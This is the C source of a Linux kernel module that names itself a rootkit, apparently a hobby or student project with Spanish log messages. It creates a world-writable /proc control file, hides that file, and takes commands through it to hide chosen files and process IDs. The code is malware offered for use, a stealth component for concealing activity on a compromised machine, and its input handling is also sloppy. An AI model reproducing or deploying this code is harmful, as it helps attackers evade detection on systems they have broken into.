#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <linux/version.h> // LINUX_VERSION_CODE
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/uaccess.h> // copy from user
#include <linux/proc_fs.h>
#include <asm/paravirt.h> // write_cr0

#include "proc.h"
#include "hooks.h"

#define PROC_FILENAME "rootkit_proc"
#define LONG_ORDEN 256

char orden[LONG_ORDEN];


static ssize_t write_proc(struct file* f, const char __user* buff, size_t len, loff_t* off){
    printk(KERN_INFO "ROOTKIT: Hi from write_proc\n");
    if (len > LONG_ORDEN){
        return -1;
    }

	// I don't know if this should be handled here
	int id, pid;
	char filename[len - sizeof(id)];
	copy_from_user(&id, buff, sizeof(id));
	switch (id){
		case 0: // HIDE FILE
			copy_from_user(filename, buff + sizeof(int), sizeof(filename));
			if (hide_file(filename) == -1)
				printk(KERN_INFO "ROOTKIT: ERROR hiding file %s in proc\n", filename);
			printk(KERN_INFO "ROOTKIT: petición esconder file %s terminada\n", filename);
			break;
		case 1: // HIDE PID
			copy_from_user(&pid, buff + sizeof(int), sizeof(pid));
			if (hide_pid(pid) == -1)
				printk(KERN_INFO "ROOTKIT: ERROR hiding pid %d in proc\n", pid);
			printk(KERN_INFO "ROOTKIT: petición esconder pid %d terminada\n", pid);
			break;
		default:
			printk(KERN_INFO "ROOTKIT: ERROR Unknown peticion a proc\n");
	}

    //copy_from_user(orden, buff, len);
    //printk(KERN_INFO "ROOTKIT: write_proc %s\n", orden);
    return len;
}

static struct file_operations proc_fops = {
    .write = write_proc
};

int __init proc_init(void){
	if (proc_create(PROC_FILENAME, 0666, NULL, &proc_fops) == NULL){
		printk(KERN_INFO "ROOTKIT error trying to create proc file\n");
		return -1;
	}
	if (hide_file(PROC_FILENAME) == -1){
		printk(KERN_INFO "ROOTKIT error trying to hide proc file\n");
		remove_proc_entry(PROC_FILENAME, NULL);
		return -1;
	}
	return 0;
}

void __exit proc_exit(void){
	unhide_file(PROC_FILENAME);
    remove_proc_entry(PROC_FILENAME, NULL);
}